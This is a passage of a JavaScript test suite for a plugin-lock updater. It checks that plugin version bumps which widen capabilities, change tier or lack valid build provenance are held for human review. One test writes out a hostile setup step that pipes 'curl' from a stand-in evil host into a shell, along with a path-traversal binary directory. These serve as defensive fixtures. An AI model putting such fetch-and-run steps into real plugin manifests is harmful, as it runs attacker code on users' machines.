import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import test from "node:test";

import { describeManifest } from "./plugin-caps.mjs";
import {
  WORDS_ONLY_KEYS,
  assertOnMain,
  attestationArgs,
  attestationIdentity,
  capabilityChange,
  capabilityLines,
  code,
  commandMessage,
  ghEnv,
  manifestBehaviour,
  manifestFields,
  md,
  newer,
  outputs,
  parseLock,
  parseSums,
  provenanceFailure,
  provenanceFrom,
  pullRequest,
  resolveTagCommit,
  review,
  sameBehaviour,
  setLockValues,
  toolArtifacts,
  verifyProvenance,
} from "./plugin-lock.mjs";

const LOCK = `# comment
[[plugin]]
id = "latex"
name = "LaTeX"
summary = "Build .tex to PDF."
category = "writing"
version = "0.1.3"
repo = "martinappberg/chimaera-plugin-latex"
sha256_wasm = "${"a".repeat(64)}"
sha256_toml = "${"b".repeat(64)}"
tier = "privileged"
caps = "${"1".repeat(64)}"

[[plugin]]
id = "mycelium"
name = "Mycelium"
summary = "Project memory — findings, decisions, learnings."   # the card's line
category = "knowledge"
version = "0.1.2"
repo = "martinappberg/chimaera-plugin-mycelium"
sha256_wasm = "${"c".repeat(64)}"
sha256_toml = "${"d".repeat(64)}"
tier = "sandboxed"
caps = "${"2".repeat(64)}"
`;

test("the repository's own lock parses", () => {
  const entries = parseLock(readFileSync(new URL("../../plugins/plugins.lock", import.meta.url), "utf8"));
  assert.ok(entries.length >= 1);
  for (const e of entries) assert.match(e.version, /^\d+\.\d+\.\d+$/);
});

test("a bump rewrites only that entry's values, comments and layout kept", () => {
  const [, mycelium] = parseLock(LOCK);
  assert.equal(mycelium.id, "mycelium");
  const next = setLockValues(LOCK, mycelium, {
    version: "0.1.3",
    sha256_wasm: "e".repeat(64),
    sha256_toml: "f".repeat(64),
    name: "Mycelium",
    summary: "Project memory — findings, decisions, learnings.",
  });
  assert.equal(next.split("\n").length, LOCK.split("\n").length);
  const [latex, bumped] = parseLock(next);
  assert.equal(latex.version, "0.1.3");
  assert.equal(latex.sha256_wasm, "a".repeat(64));
  assert.equal(bumped.version, "0.1.3");
  assert.equal(bumped.sha256_wasm, "e".repeat(64));
  assert.match(next, /learnings\."   # the card's line/);
});

test("a value the lock can't hold is refused, not written", () => {
  const [entry] = parseLock(LOCK);
  assert.throws(() => setLockValues(LOCK, entry, { summary: 'says "hi"' }), /can't store/);
  assert.throws(() => setLockValues(LOCK, entry, { summary: "two\nlines" }), /can't store/);
});

test("the lock grammar is strict", () => {
  assert.throws(() => parseLock(`[[plugin]]\nid = "x"\n`), /has no name/);
  assert.throws(() => parseLock(`${LOCK}\nextra = 1\n`), /not a \[\[plugin\]\] header/);
  assert.throws(() => parseLock(LOCK.replace('version = "0.1.2"', 'version = "0.1.2"\nversion = "0.1.3"')), /set twice/);
  assert.throws(() => parseLock(LOCK.replace('version = "0.1.2"', 'version = "latest"')), /has version/);
});

test("a manifest's lock fields: top level before the first table, [release] github", () => {
  const toml = `# Mycelium
id = "mycelium"
name = "Mycelium"
version = "0.1.3"
summary = "Project memory — findings."
description = "Long \\"quoted\\" prose"
api = "0.1"

[detect]
any = [".living/INDEX.md"]

[recommends]
summary = "not the plugin's summary"

[release]
github = "martinappberg/chimaera-plugin-mycelium"
`;
  assert.deepEqual(manifestFields(toml), {
    id: "mycelium",
    name: "Mycelium",
    summary: "Project memory — findings.",
    version: "0.1.3",
    github: "martinappberg/chimaera-plugin-mycelium",
  });
  assert.equal(manifestFields('name = "a \\"b\\""\n').name, undefined, "an escaped string reads as absent");
});

test("SHA256SUMS in sha256sum's forms", () => {
  const sums = parseSums(`${"A".repeat(64)}  plugin.wasm\n${"b".repeat(64)} *./plugin.toml\nnot a line\n`);
  assert.equal(sums.get("plugin.wasm"), "a".repeat(64));
  assert.equal(sums.get("plugin.toml"), "b".repeat(64));
  assert.equal(sums.size, 2);
});

test("versions compare numerically", () => {
  assert.equal(newer("0.1.10", "0.1.9"), true);
  assert.equal(newer("0.2.0", "0.1.99"), true);
  assert.equal(newer("0.1.2", "0.1.2"), false);
  assert.equal(newer("0.1.1", "0.1.2"), false);
});

test("the pull request is a fix: (a patch release ships the new lock)", () => {
  const bump = (id, name, to) => ({
    id, name, to, from: "0.1.0", repo: `o/${id}`, url: "https://x", compare: "https://y", sha256_wasm: "a", sha256_toml: "b", wasm_bytes: 1,
    tier: "sandboxed", from_tier: "sandboxed", caps: "1".repeat(64), from_caps: "1".repeat(64), can: [], added: [], removed: [],
    unreadable: null, lock_drift: null, automerge: true, why: null,
  });
  const one = pullRequest([bump("mycelium", "Mycelium", "0.1.3")]);
  assert.equal(one.title, "fix: update Mycelium to 0.1.3");
  assert.equal(one.branch, "plugin-lock/mycelium-0.1.3");
  const two = pullRequest([bump("latex", "LaTeX", "0.1.4"), bump("mycelium", "Mycelium", "0.1.3")]);
  assert.equal(two.title, "fix: update first-party plugins (LaTeX 0.1.4, Mycelium 0.1.3)");
  assert.equal(two.branch, "plugin-lock/latex-0.1.4+mycelium-0.1.3");
  assert.match(two.body, /\| Mycelium \(`mycelium`\) \| 0\.1\.0 \| 0\.1\.3 \|/);
  assert.equal(two.automerge, true);
  assert.match(two.body, /Auto-merge \(squash\) is on/);
  const grown = pullRequest([{ ...bump("mycelium", "Mycelium", "0.2.0"), automerge: false, why: "its capability lines changed: it may ask for more" }]);
  assert.equal(grown.automerge, false, "asking for more waits for a person");
  assert.match(grown.body, /no auto-merge/);
  assert.match(grown.body, /`mycelium` 0\.2\.0: ` its capability lines changed: it may ask for more `/);
});

test("capability lines: api and the tables that say what it can do, not the card's words", () => {
  const base = `# a comment
id = "x"
name = "X"
version = "0.1.0"
summary = "One line."
api = "0.1"

[provides]
mcp_tools = ["a", "b"]

[adds]
ui = ["words"]

[release]
github = "o/x"
`;
  assert.deepEqual(capabilityLines(base), ['api = "0.1"', "[provides]", 'mcp_tools = ["a", "b"]']);
  const reworded = base.replace('summary = "One line."', 'summary = "Other words."').replace('ui = ["words"]', 'ui = ["new words"]').replace('version = "0.1.0"', 'version = "0.2.0"');
  assert.deepEqual(capabilityLines(reworded), capabilityLines(base), "new words and a new version ask for nothing");
  const grown = base.replace('mcp_tools = ["a", "b"]', 'mcp_tools = ["a", "b", "c"]');
  assert.notDeepEqual(capabilityLines(grown), capabilityLines(base));
  const access = `${base}\n[access]\ntimeline = "none"\n`;
  assert.notDeepEqual(capabilityLines(access), capabilityLines(base), "even a narrowing is reviewed");
  assert.notDeepEqual(capabilityLines(base.replace('api = "0.1"', 'api = "0.2"')), capabilityLines(base), "the API decides the defaults");
});

test("tool downloads: every [[tools.artifacts]] with its tool, read by the TOML parse", () => {
  const toml = [
    'id = "latex"',
    "[[tools]]",
    'id = "tinytex"',
    'version = "2026.09"',
    "[[tools.artifacts]]",
    'platform = "linux-x86_64"',
    'url = "https://github.com/rstudio/tinytex-releases/releases/download/v2026.09/TinyTeX-1.tar.xz"',
    `sha256 = "${"a".repeat(64)}"`,
    "size = 159_000_000",
    "[[tools.artifacts]]",
    'platform = "macos-aarch64"',
    "url = 'not-https'",
    "size = -1",
    "[[tools.setup]]",
    'program = "tlmgr"',
    "[[tools]]",
    'id = "other"',
    "[[tools.artifacts]]",
    'platform = "linux-x86_64"',
    'url = "https://example.org/other.zip"',
    `sha256 = "${"b".repeat(64)}"`,
  ].join("\n");
  assert.deepEqual(toolArtifacts(toml), [
    {
      tool: "tinytex",
      platform: "linux-x86_64",
      url: "https://github.com/rstudio/tinytex-releases/releases/download/v2026.09/TinyTeX-1.tar.xz",
      sha256: "a".repeat(64),
      size: 159000000,
    },
    { tool: "tinytex", platform: "macos-aarch64", url: "not-https", sha256: null, size: null },
    { tool: "other", platform: "linux-x86_64", url: "https://example.org/other.zip", sha256: "b".repeat(64), size: null },
  ]);
  assert.deepEqual(toolArtifacts('id = "notes"\n[adds]\nui = ["x"]\n'), []);
  assert.throws(() => toolArtifacts("x = 1979-05-27\n"), /dates and times/, "TOML it can't read is refused");
});

test("tool downloads written inline are the same list as [[tools.artifacts]] tables", () => {
  const a = "a".repeat(64);
  const b = "b".repeat(64);
  const tables = [
    'api = "0.2"',
    "[[programs]]",
    'name = "typst"',
    "[[tools]]",
    'id = "typst"',
    'name = "Typst"',
    'version = "0.14.2"',
    'programs = ["typst"]',
    "[[tools.artifacts]]",
    'platform = "linux-x86_64"',
    'url = "https://example.org/typst.tar.xz"',
    `sha256 = "${a}"`,
    "size = 1_000",
    'unpack = "tar.xz"',
    "[[tools.artifacts]]",
    'platform = "macos-aarch64"',
    'url = "https://example.org/typst.zip"',
    `sha256 = "${b}"`,
    "size = 2000",
    'unpack = "zip"',
  ].join("\n");
  const inline = [
    'api = "0.2"',
    'programs = [{ name = "typst" }]',
    "[[tools]]",
    'id = "typst"',
    'name = "Typst"',
    'version = "0.14.2"',
    'programs = ["typst"]',
    "artifacts = [",
    `  { platform = "linux-x86_64", url = "https://example.org/typst.tar.xz", sha256 = "${a}", size = 1000, unpack = "tar.xz" },`,
    `  { platform = "macos-aarch64", url = 'https://example.org/typst.zip', sha256 = "${b}", size = 2_000, unpack = "zip" },`,
    "]",
  ].join("\n");
  const want = [
    { tool: "typst", platform: "linux-x86_64", url: "https://example.org/typst.tar.xz", sha256: a, size: 1000 },
    { tool: "typst", platform: "macos-aarch64", url: "https://example.org/typst.zip", sha256: b, size: 2000 },
  ];
  assert.deepEqual(toolArtifacts(tables), want);
  assert.deepEqual(toolArtifacts(inline), want);
  // The capability parse sees the same downloads in both forms.
  const atoms = (t) => describeManifest(`id = "d"\nname = "D"\nversion = "0.1.0"\nsummary = "s"\n${t}`).atoms;
  assert.deepEqual(atoms(inline), atoms(tables));
});

// --- A bump that needs review arrives ready: tier, caps and the change in words.

/** A release's plugin.toml for the bump tests. */
const release = (version, extra = "", name = "Notes") =>
  [
    'id = "notes"',
    `name = "${name}"`,
    `version = "${version}"`,
    'summary = "Notes for agents."',
    'api = "0.2"',
    "",
    "[access]",
    'files = "read"',
    "",
    "[provides]",
    'mcp_tools = ["notes_read"]',
    extra,
    "",
    "[adds]",
    'agents = ["notes_read"]',
    "",
    "[release]",
    'github = "o/notes"',
    "",
  ].join("\n");

/** What `check` returns for a bump from `pinned` to `next`, without the
 *  network: the same functions, the same order. */
function bumpOf(pinned, next, { tier } = {}) {
  const before = describeManifest(pinned);
  const entry = { id: "notes", tier: tier ?? before.tier, caps: before.caps };
  const m = manifestFields(next);
  return {
    id: "notes",
    name: m.name,
    summary: m.summary,
    repo: "o/notes",
    from: before.version,
    to: m.version,
    url: `https://github.com/o/notes/releases/tag/v${m.version}`,
    compare: `https://github.com/o/notes/compare/v${before.version}...v${m.version}`,
    sha256_wasm: "e".repeat(64),
    sha256_toml: "f".repeat(64),
    wasm_bytes: 1,
    tools_checked: 0,
    ...capabilityChange(entry, pinned, next),
    ...review(entry, pinned, next),
  };
}

/** The lock entry for a pinned release, as the lock records it. */
const entryOf = (pinned, over = {}) => {
  const d = describeManifest(pinned);
  return { id: "notes", tier: d.tier, caps: d.caps, ...over };
};

/** A privileged release of the same plugin (it runs pandoc). */
const privileged = (version, extra = "") => release(version, `[[programs]]\nname = "pandoc"${extra}`);
/** What `verifyProvenance` answers for an attested release. */
const PROVENANCE_AT = { workflow: ".github/workflows/release.yml", refs: ["refs/tags/v0.1.1", "refs/heads/main"], commit: "1".repeat(40) };
const VERIFIED = { ...PROVENANCE_AT, verified: true, why: null, ref: "refs/tags/v0.1.1" };
const unverified = (why) => ({ ...PROVENANCE_AT, verified: false, why, ref: null });

test("auto-merge needs the same tier, the approved digest, the same manifest but its words, and provenance when privileged (the safeguard)", () => {
  const pinned = release("0.1.0");
  const reworded = release("0.1.1").replace("Notes for agents.", "Other words.");
  const grown = release("0.1.1", '[[programs]]\nname = "pandoc"');
  const sandboxed = entryOf(pinned);
  // Every case of the rule, spelled out: loosening any of them must fail here.
  assert.deepEqual(review(sandboxed, pinned, reworded), { automerge: true, why: null }, "sandboxed needs no provenance");
  assert.deepEqual(review(sandboxed, pinned, reworded, unverified("no attestation")), { automerge: true, why: null });
  assert.equal(review(sandboxed, pinned, grown, VERIFIED).automerge, false, "new capabilities wait, attested or not");
  const pinnedPriv = privileged("0.1.0");
  const priv = entryOf(pinnedPriv);
  const privSame = privileged("0.1.1").replace("Notes for agents.", "Other words.");
  assert.deepEqual(review(priv, pinnedPriv, privSame, VERIFIED), { automerge: true, why: null }, "privileged, unchanged, attested");
  assert.equal(review(priv, pinnedPriv, privSame).automerge, false, "privileged without a provenance check waits");
  assert.equal(review(priv, pinnedPriv, privSame, unverified("no attestation")).automerge, false);
  assert.equal(review(priv, pinnedPriv, privSame, { verified: "true" }).automerge, false, "only verified === true counts");
  assert.equal(review({ ...sandboxed, tier: "privileged" }, pinned, reworded, VERIFIED).automerge, false, "the lock's tier must be the pinned release's");
  assert.equal(review({ ...sandboxed, tier: "" }, pinned, reworded).automerge, false, "only the exact words sandboxed or privileged");
  assert.equal(review({ ...sandboxed, tier: "Sandboxed" }, pinned, reworded).automerge, false);
  assert.equal(review({ ...priv, tier: "Privileged" }, pinnedPriv, privSame, VERIFIED).automerge, false);
  // The comparison is of the parsed manifest, not its text: formatting alone
  // (an inline comment, another string quote) changes nothing.
  const commented = pinned.replace('files = "read"', "files = 'read' # still read");
  assert.deepEqual(review(sandboxed, pinned, commented), { automerge: true, why: null });
  // The pull request follows the bumps: one that waits holds back all.
  const ok = bumpOf(pinned, reworded);
  const waits = { ...bumpOf(pinned, grown), id: "other", to: "0.2.0" };
  assert.equal(pullRequest([ok]).automerge, true);
  assert.equal(pullRequest([ok, waits]).automerge, false);
  assert.equal(outputs([ok], []), "bumped=true\nautomerge=true\nproblems=0\n");
  assert.equal(outputs([ok, waits], []), "bumped=true\nautomerge=false\nproblems=0\n");
  assert.equal(outputs([], ["x"]), "bumped=false\nautomerge=false\nproblems=1\n");
});

/** `release` without its [provides] table: capability tables written as
 *  top-level keys then precede every table. */
const noProvides = (version, top = "") => release(version).replace('[provides]\nmcp_tools = ["notes_read"]\n', "").replace('api = "0.2"', `api = "0.2"${top}`);

test("capability changes the line heuristic can't see never merge by themselves", () => {
  // Each of these has the pinned release's capability lines (the old,
  // line-based rule said "unchanged" and would have merged it).
  const pinned = release("0.1.0");
  const topLevelProgram = release("0.1.1").replace('api = "0.2"', 'api = "0.2"\nprograms = [{ name = "bash" }]');
  const commentedHeader = `${release("0.1.1")}[[programs]] # x\nname = "bash"\n`;
  const dottedPinned = noProvides("0.1.0");
  const dottedTool = noProvides("0.1.1", '\nprovides.mcp_tools = ["evil"]');
  for (const [p, r] of [[pinned, topLevelProgram], [pinned, commentedHeader], [dottedPinned, dottedTool]]) {
    assert.deepEqual(capabilityLines(r), capabilityLines(p), "the line heuristic alone is blind to it");
    assert.equal(sameBehaviour(p, r), false, "the structural comparison is not");
  }
  const tierAndMore = "its tier changes (sandboxed → privileged); its capability digest is not the approved one: it may ask for more; its manifest changes more than its words";
  assert.deepEqual(review(entryOf(pinned), pinned, topLevelProgram, VERIFIED), { automerge: false, why: tierAndMore });
  assert.equal(describeManifest(topLevelProgram).tier, "privileged");
  assert.deepEqual(review(entryOf(pinned), pinned, commentedHeader, VERIFIED), { automerge: false, why: tierAndMore });
  assert.equal(describeManifest(dottedTool).tier, "sandboxed");
  assert.deepEqual(review(entryOf(dottedPinned), dottedPinned, dottedTool, VERIFIED), {
    automerge: false,
    why: "its capability digest is not the approved one: it may ask for more; its manifest changes more than its words",
  });
  // And the PR they open says so (the reason a literal code span), and
  // writes the release's own tier and caps.
  const bump = bumpOf(pinned, topLevelProgram);
  assert.equal(bump.tier, "privileged");
  const { body, automerge } = pullRequest([bump]);
  assert.equal(automerge, false);
  assert.match(body, /`notes` 0\.1\.1: ` its tier changes \(sandboxed → privileged\); its capability digest is not the approved one/);
  assert.match(body, /- Tier: sandboxed → \*\*privileged\*\*/);
  assert.match(body, /Runs bash: this plugin can run any command on this host/);
});

/** A privileged plugin with a downloaded tool, like latex: what the digest
 *  leaves out lives in its setup steps, version args, bin and unpack. */
const withTool = (version, { setup = 'args = ["--version"]', programVersion = '["--version"]', bin = "bin", unpack = "tar.gz" } = {}) =>
  release(
    version,
    [
      "",
      "[[programs]]",
      'name = "tlmgr"',
      `version = ${programVersion}`,
      "",
      "[[tools]]",
      'id = "tinytex"',
      'name = "TinyTeX"',
      'version = "2026.09"',
      'programs = ["tlmgr"]',
      "",
      "[[tools.artifacts]]",
      'platform = "linux-x86_64"',
      'url = "https://example.org/tinytex.tar.gz"',
      `sha256 = "${"a".repeat(64)}"`,
      "size = 1000",
      `unpack = "${unpack}"`,
      `bin = "${bin}"`,
      "",
      "[[tools.setup]]",
      'program = "tlmgr"',
      setup,
    ].join("\n"),
  );

test("what the digest leaves out is compared too: setup steps, version args, bin, unpack — in every TOML form", () => {
  const pinned = withTool("0.1.0");
  const entry = entryOf(pinned);
  assert.equal(entry.tier, "privileged");
  const evilSetup = 'args = ["-e", "system(q{curl -s https://evil.example/x|sh})"]';
  const variants = {
    "tools.setup": withTool("0.1.1", { setup: evilSetup }),
    "programs.version": withTool("0.1.1", { programVersion: '["-e", "system(q{x})"]' }),
    bin: withTool("0.1.1", { bin: "../../usr/bin" }),
    unpack: withTool("0.1.1", { unpack: "none" }),
    // The reviewer's form: a second setup step after [release], under a
    // header with a trailing comment.
    "tools.setup, commented header": `${withTool("0.1.1")}\n[[tools.setup]] # appended\nprogram = "tlmgr"\n${evilSetup}\n`,
    "tools.setup, inline table": withTool("0.1.1").replace(/\[\[tools\.setup\]\]\nprogram = "tlmgr"\nargs = \["--version"\]/, ""
    ).replace('programs = ["tlmgr"]', `programs = ["tlmgr"]\nsetup = [{ program = "tlmgr", ${evilSetup} }]`),
    "programs.version, dotted keys": withTool("0.1.1").replace(/\[\[programs\]\]\nname = "tlmgr"\nversion = \["--version"\]/, "[[programs]]\nname = \"tlmgr\"\nversion.0 = 1"),
  };
  for (const [what, next] of Object.entries(variants)) {
    let readable = true;
    try {
      describeManifest(next);
    } catch {
      readable = false;
    }
    if (readable) {
      assert.equal(describeManifest(next).tier, "privileged", what);
      if (!what.startsWith("programs.version, dotted")) assert.equal(describeManifest(next).caps, entry.caps, `${what}: the digest doesn't see it`);
    }
    assert.equal(sameBehaviour(pinned, next), false, what);
    const got = review(entry, pinned, next, VERIFIED);
    assert.equal(got.automerge, false, what);
    assert.match(got.why, /its manifest changes more than its words/, what);
  }
  // The same table written inline and as headers is the same manifest.
  const inlineSame = withTool("0.1.1").replace(/\n\[\[tools\.setup\]\]\nprogram = "tlmgr"\nargs = \["--version"\]/, "").replace('programs = ["tlmgr"]', 'programs = ["tlmgr"]\nsetup = [{ program = "tlmgr", args = ["--version"] }]');
  assert.equal(sameBehaviour(pinned, inlineSame), true);
  assert.deepEqual(review(entry, pinned, inlineSame, VERIFIED), { automerge: true, why: null });
  // Only the words differ: it may merge.
  const words = withTool("0.1.1")
    .replace("Notes for agents.", "Notes, for agents, now.")
    .replace('name = "Notes"', 'name = "Notes Pro"')
    .replace('agents = ["notes_read"]', 'agents = ["notes_read, said better"]')
    .replace('api = "0.2"', 'api = "0.2"\ndescription = "Longer words."\nhomepage = "https://example.org"\ncategory = "writing"');
  assert.equal(sameBehaviour(pinned, words), true);
  assert.deepEqual(review(entry, pinned, words, VERIFIED), { automerge: true, why: null });
  assert.equal(sameBehaviour(pinned, `${words}\n[recommends]\nsummary = "Why."\n`), true, "a summary is words");
  assert.equal(sameBehaviour(pinned, `${words}\n[requires]\nchimaera = ">=9.0.0"\n`), false, "a requirement is not");
  assert.equal(sameBehaviour(pinned, `${words}\n[detect]\nany = ["x"]\n`), false, "where it's active is not");
  assert.equal(sameBehaviour(pinned, `${words}\nzz_unknown = 1\n`), false, "an unknown key is not");
  assert.equal(sameBehaviour(pinned, "not toml ["), false, "an unreadable manifest is not");
  assert.deepEqual(WORDS_ONLY_KEYS.map((k) => k.join(".")), [
    "version",
    "name",
    "summary",
    "description",
    "homepage",
    "category",
    "adds",
    "requires.summary",
    "recommends.summary",
  ]);
});

/** The commit a test release's tag points to, and another one. */
const TAGGED = "1".repeat(40);
const OTHER_COMMIT = "2".repeat(40);
const ID = { repo: "o/notes", workflow: ".github/workflows/release.yml", refs: ["refs/tags/v0.1.1", "refs/heads/main"], commit: TAGGED };
const WASM = "e".repeat(64);
const TOML = "f".repeat(64);
const DIGESTS = { wasm: WASM, toml: TOML };

/** One attestation as `gh attestation verify --format json` prints it. */
const attestation = ({
  repo = "o/notes",
  san = null,
  workflow = ".github/workflows/release.yml",
  ref = "refs/tags/v0.1.1",
  commit = TAGGED,
  runner = "github-hosted",
  issuer = "https://token.actions.githubusercontent.com",
  predicate = "https://slsa.dev/provenance/v1",
  subjects = [WASM, TOML],
} = {}) => ({
  attestation: {},
  verificationResult: {
    signature: {
      certificate: {
        subjectAlternativeName: san ?? `https://github.com/${repo}/${workflow}@${ref}`,
        issuer,
        sourceRepositoryURI: `https://github.com/${repo}`,
        sourceRepositoryRef: ref,
        sourceRepositoryDigest: commit,
        runnerEnvironment: runner,
      },
    },
    statement: { predicateType: predicate, subject: subjects.map((sha, n) => ({ name: `f${n}`, digest: { sha256: sha } })) },
  },
});
const ghResult = (opts = {}) => JSON.stringify([attestation(opts)]);

test("provenance: gh's result is checked again — repository, signer, ref, issuer, commit, runner, predicate, both files", () => {
  assert.deepEqual(attestationIdentity("o/notes", "v0.1.1", TAGGED), ID);
  assert.throws(() => attestationIdentity("o/notes", "v0.1.1", "abc"), /not a commit/);
  const at = (opts, ref = "refs/tags/v0.1.1") => provenanceFrom(ghResult({ ref, ...opts }), ID, DIGESTS, ref);
  assert.deepEqual(at({}), { verified: true, why: null }, "signed at the tag, from the tagged commit");
  assert.deepEqual(at({ ref: "refs/heads/main" }, "refs/heads/main"), { verified: true, why: null }, "run by hand on main, from the tagged commit");
  assert.deepEqual(at({ commit: OTHER_COMMIT }), { verified: false, why: "an attestation built from another commit than the tag's" });
  assert.deepEqual(at({ repo: "evil/notes" }), { verified: false, why: "an attestation from another repository" });
  assert.deepEqual(at({ repo: "xo/notes" }), { verified: false, why: "an attestation from another repository" }, "a repository with the same name suffix");
  assert.deepEqual(at({ runner: "self-hosted" }), { verified: false, why: "an attestation made on a self-hosted runner" });
  assert.deepEqual(at({ issuer: "https://evil.example" }), { verified: false, why: "an attestation not issued to GitHub Actions" });
  assert.deepEqual(at({ predicate: "https://example.com/other/v1" }), { verified: false, why: "an attestation that is not SLSA build provenance" });
  assert.deepEqual(at({ subjects: ["0".repeat(64), TOML] }), { verified: false, why: "an attestation over other bytes" });
  // plugin.toml swapped after the run: the attestation names another toml.
  assert.deepEqual(at({ subjects: [WASM, "9".repeat(64)] }), { verified: false, why: "no attestation covers this plugin.toml with this plugin.wasm" });
  assert.deepEqual(at({ subjects: [WASM] }), { verified: false, why: "no attestation covers this plugin.toml with this plugin.wasm" });
  // Two unrelated attestations, one over each file, never add up to one.
  const split = JSON.stringify([attestation({ subjects: [WASM] }), attestation({ subjects: [TOML] })]);
  assert.deepEqual(provenanceFrom(split, ID, DIGESTS, "refs/tags/v0.1.1"), {
    verified: false,
    why: "no attestation covers this plugin.toml with this plugin.wasm",
  });
  // An old run's wasm with a relabelled toml (a rollback under a new
  // version): that run attested the old toml, not this one.
  const oldRun = JSON.stringify([attestation({ subjects: [WASM, "8".repeat(64)], commit: OTHER_COMMIT })]);
  assert.equal(provenanceFrom(oldRun, ID, DIGESTS, "refs/tags/v0.1.1").verified, false);
  const oldRunSameCommit = JSON.stringify([attestation({ subjects: [WASM, "8".repeat(64)] })]);
  assert.deepEqual(provenanceFrom(oldRunSameCommit, ID, DIGESTS, "refs/tags/v0.1.1"), {
    verified: false,
    why: "no attestation covers this plugin.toml with this plugin.wasm",
  });
  // One good attestation among others is enough; it alone carries everything.
  const mixed = JSON.stringify([attestation({ subjects: [WASM] }), attestation({})]);
  assert.deepEqual(provenanceFrom(mixed, ID, DIGESTS, "refs/tags/v0.1.1"), { verified: true, why: null });
  // Look-alike signers never pass for the expected one.
  const base = "https://github.com/o/notes/.github/workflows";
  for (const [san, why] of [
    [`${base}/release.yml.evil@refs/tags/v0.1.1`, /another workflow/],
    [`${base}/ci.yml@refs/tags/v0.1.1`, /another workflow/],
    [`${base}/release.yml@refs/heads/main2`, /another ref/],
    [`${base}/release.yml@refs/heads/feature`, /another ref/],
    [`${base}/release.yml@refs/tags/v0.1.1-x`, /another ref/],
    [`https://github.com/xo/notes/.github/workflows/release.yml@refs/tags/v0.1.1`, /another workflow/],
  ]) {
    const got = provenanceFrom(ghResult({ san }), ID, DIGESTS, "refs/tags/v0.1.1");
    assert.equal(got.verified, false, san);
    assert.match(got.why, why, san);
  }
  assert.deepEqual(provenanceFrom(ghResult({ ref: "refs/heads/feature" }), ID, DIGESTS, "refs/heads/feature"), {
    verified: false,
    why: "not an accepted ref: refs/heads/feature",
  });
  assert.deepEqual(provenanceFrom("[]", ID, DIGESTS, "refs/tags/v0.1.1"), { verified: false, why: "no attestation" });
  assert.deepEqual(provenanceFrom("not json", ID, DIGESTS, "refs/tags/v0.1.1"), { verified: false, why: "gh printed no verification result" });
});

/** A GitHub API stand-in: path → JSON (absent: 404). */
const apiOf = (map) => async (path) => {
  if (!(path in map)) throw Object.assign(new Error(`${path}: HTTP 404`), { status: 404 });
  return map[path];
};
const TAG_REF = "/repos/o/notes/git/ref/tags/v0.1.1";
const COMPARE = `/repos/o/notes/compare/${TAGGED}...main`;
/** The API for a tag on `commit`, and main's compare answer for it. */
const githubFor = (commit = TAGGED, compare = { status: "ahead", merge_base_commit: { sha: commit } }) =>
  apiOf({
    [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "commit", sha: commit } },
    [`/repos/o/notes/compare/${commit}...main`]: compare,
  });

test("the tag resolves to a commit through the API, for exactly that tag, an annotated tag dereferenced", async () => {
  assert.equal(await resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "commit", sha: TAGGED } } })), TAGGED);
  const annotated = "3".repeat(40);
  assert.equal(
    await resolveTagCommit(
      "o/notes",
      "v0.1.1",
      apiOf({
        [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "tag", sha: annotated } },
        [`/repos/o/notes/git/tags/${annotated}`]: { object: { type: "commit", sha: TAGGED } },
      }),
    ),
    TAGGED,
  );
  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({})), /404/);
  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.10", object: { type: "commit", sha: TAGGED } } })), /another ref/);
  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { object: { type: "commit", sha: TAGGED } } })), /another ref/);
  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "tree", sha: TAGGED } } })), /does not resolve to a commit/);
  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "commit", sha: "abc" } } })), /does not resolve to a commit/);
  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "tag", sha: annotated } } })), /404/);
});

test("the tagged commit must be on main", async () => {
  await assertOnMain("o/notes", TAGGED, apiOf({ [COMPARE]: { status: "ahead", merge_base_commit: { sha: TAGGED } } }));
  await assertOnMain("o/notes", TAGGED, apiOf({ [COMPARE]: { status: "identical", merge_base_commit: { sha: TAGGED } } }));
  for (const [what, answer, why] of [
    ["a side commit", { status: "diverged", merge_base_commit: { sha: OTHER_COMMIT } }, /not on main \(compare: diverged\)/],
    ["ahead of main", { status: "behind", merge_base_commit: { sha: OTHER_COMMIT } }, /compare: behind/],
    ["no status", { merge_base_commit: { sha: TAGGED } }, /compare: no status/],
    ["another merge base", { status: "ahead", merge_base_commit: { sha: OTHER_COMMIT } }, /another merge base/],
    ["no merge base", { status: "ahead" }, /another merge base/],
    ["an odd status", { status: "<b>x</b>", merge_base_commit: { sha: TAGGED } }, /not on main/],
  ]) {
    await assert.rejects(assertOnMain("o/notes", TAGGED, apiOf({ [COMPARE]: answer })), why, what);
  }
  await assert.rejects(assertOnMain("o/notes", TAGGED, apiOf({})), /404/, "a compare error");
  let asked = false;
  const never = async () => {
    asked = true;
    return {};
  };
  await assert.rejects(assertOnMain("o/notes/../x", TAGGED, never), /not a repository/);
  await assert.rejects(assertOnMain("o/notes", "main", never), /not a commit/);
  assert.equal(asked, false, "inputs are checked before any URL is built");
});

/** A gh stand-in: answers per `--source-ref`, records every call. */
function fakeGh(answers) {
  const calls = [];
  const run = async (cmd, args, opts) => {
    calls.push({ cmd, args, opts });
    const ref = args[args.indexOf("--source-ref") + 1];
    const answer = answers[ref];
    if (answer === undefined) throw Object.assign(new Error("exit 1"), { stderr: "Error: HTTP 404: Not Found" });
    if (answer instanceof Error) throw answer;
    return { stdout: answer };
  };
  return { run, calls };
}
const WASM_BYTES = Buffer.from("wasm");
const TOML_BYTES = Buffer.from('id = "notes"\n');
const sha = (b) => createHash("sha256").update(b).digest("hex");
/** gh output for an attestation over this test's two files. */
const ghFor = (opts = {}) => ghResult({ subjects: [sha(WASM_BYTES), sha(TOML_BYTES)], ...opts });

test("provenance: every failure is a reason, never a throw; either accepted ref verifies", async () => {
  assert.equal(provenanceFailure({ code: "ENOENT" }), "gh is not installed");
  assert.equal(provenanceFailure({ stderr: "Error: HTTP 404: Not Found (https://api.github.com/repos/o/notes/attestations/sha256:ab)" }), "no attestation");
